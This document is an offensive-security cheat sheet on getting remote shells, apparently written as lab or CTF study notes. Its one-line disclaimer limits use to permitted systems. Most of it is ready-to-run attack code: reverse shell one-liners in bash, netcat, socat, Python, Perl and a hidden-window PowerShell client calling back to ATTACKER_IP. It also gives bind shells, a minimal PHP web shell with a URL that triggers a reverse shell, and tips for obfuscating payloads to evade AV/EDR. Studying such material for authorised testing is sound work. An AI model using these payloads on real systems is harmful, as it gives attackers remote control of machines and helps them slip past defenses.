# 30. SAL1 — Offensive Security Tooling: Shells Overview (Cheat Sheet)
tags: [shells, reverse, bind, webshell, nc, socat, powershell, pty, stabilization]

> ⚠️ Use these commands **only** on systems where you have explicit permission (labs/CTFs).

---

## TL;DR
- **Reverse shell**: target connects **back to you** (works when outbound/egress is allowed).  
  - Listener: `rlwrap nc -lvnp 4444`  
  - Payload (bash): `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`
- **Bind shell**: target **listens**, you connect (use when inbound to target is reachable but egress is filtered).  
  - Target: `socat TCP-LISTEN:8080,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`  
  - Attacker: `nc -nv TARGET_IP 8080`
- **Web shell**: tiny HTTP script to run OS commands or stage a reverse shell.  
  - PHP mini-shell: `<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>`
- **Stabilize TTY** after landing a shell:  
  1) `python3 -c 'import pty; pty.spawn("/bin/bash")'`  
  2) (local) `stty raw -echo; fg` → (remote) `reset; export TERM=xterm-256color`

## Reverse Shells (target → attacker)

### 1) Start a listener (attacker)
```bash
# Basic
nc -lvnp 4444
# Better UX (history, arrows)
rlwrap nc -lvnp 4444
````

### 2) Linux/Unix one-liners (run on target)

```bash
# Bash TCP reverse
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# POSIX sh + FIFO + nc (works when nc lacks -e)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f

# BusyBox nc (if available)
busybox nc ATTACKER_IP 4444 -e /bin/sh

# socat (robust PTY reverse)
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Python (spawns PTY)
python3 -c 'import os,pty,socket as s;c=s.socket();c.connect(("ATTACKER_IP",4444));[os.dup2(c.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
```

### 3) Windows one-liners (PowerShell)

```powershell
# PowerShell TCP reverse (single line)
powershell -NoP -W Hidden -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($r=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);
$o=(iex $d 2>&1|Out-String);$o+='PS '+(pwd).Path+'> ';$s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length)}"
```

## Bind Shells (target listens; attacker connects)

### 1) Start a bind shell on target

```bash
# nc with -e (not on all builds)
nc -lvnp 8080 -e /bin/bash

# Portable bind via FIFO + nc
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -lvnp 8080 > /tmp/f

# socat bind with PTY (recommended)
socat TCP-LISTEN:8080,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### 2) Connect from attacker

```bash
nc -nv TARGET_IP 8080
```

## Web Shells (HTTP-based command execution)

### Minimal PHP web shell

```php
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
```

**Use:**

```
http://victim/upload/shell.php?cmd=whoami
```

### Trigger a reverse shell via web shell

```
http://victim/upload/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
```

## Shell Stabilization (make it usable)

Run on the **remote shell**:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# In your local terminal (running nc), press Ctrl+Z to background,
stty raw -echo; fg
reset
export TERM=xterm-256color
stty rows 40 cols 120
```

Alternative:

```bash
script -qc /bin/bash /dev/null
```

## Quick Triage (“Why no shell?”)

**On attacker**

```bash
ip a | grep inet                 # confirm correct interface/IP (tun0 vs eth0)
ss -ltnp | grep 4444             # is the listener actually up?
sudo tcpdump -nni any port 4444  # do packets arrive?
```

**On target (via any code exec)**

```bash
which bash sh python3 python socat nc busybox perl powershell
```

## Gotchas (and fast fixes)

| Symptom                        | Likely Cause                                        | Quick Fix                                                                          |
| ------------------------------ | --------------------------------------------------- | ---------------------------------------------------------------------------------- |
| No callback at all             | Wrong IP (VPN vs local), wrong port, egress blocked | Use your **VPN IP**; try ports **443/80**; verify with `tcpdump`                   |
| Connects then dies             | `nc` lacks `-e`; no PTY                             | Use **FIFO** or **socat** payload; then stabilize PTY (`python3 pty.spawn`)        |
| Backspace/Ctrl-C/arrows broken | Not a real TTY                                      | Run PTY + `stty` sequence (see Stabilization)                                      |
| AV/EDR kills payload           | Known strings/behavior                              | Change port; encode/obfuscate; stage via web shell; slower cadence; prefer `socat` |
| Bind unreachable               | Inbound filtering/NAT                               | Prefer **reverse** shells; or tunnel (SSH `-R`, `chisel`, `socat`)                 |
| HTTPS proxy only               | Direct TCP blocked                                  | Use app features/SSRF to bounce; or payloads that piggyback on HTTP(S)             |
| Works in Lab A, not B          | Route/interface mismatch                            | Ensure listener binds to the **reachable** interface (not `127.0.0.1`)             |
| Windows target issues          | *nix payloads don’t run                             | Use **PowerShell** reverse or `nc.exe`/`socat.exe` builds                          |
